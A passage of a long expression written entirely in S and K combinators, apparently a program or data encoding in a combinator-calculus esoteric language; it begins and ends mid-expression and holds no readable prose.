)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K)))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))(((S)((((S)(S))((K)(((S)(K))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))))))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((((S)((K)(S)))(K))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K)))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(S))((K)(((S)(K))(K))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))(((S)((((S)(S))((K)(((S)(K))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((S)(S))((K)(((S)(K))(K))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K)))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))(((S)((((S)(S))((K)(((S)(K))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(S))((K)(((S)(K))(K))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))(((S)((((S)(S))((K)(((S)(K))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))))))))))))((K)(K)))))))(((((S)((K)(S)))(K))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))(((((S)((K)(S)))(K))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))((((((((((((((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)((K)(S)))(K))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)((K)((K)(((S)(K))(K)))))))))((K)(K))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))))))(((S)(K))(K)))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))))))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K)))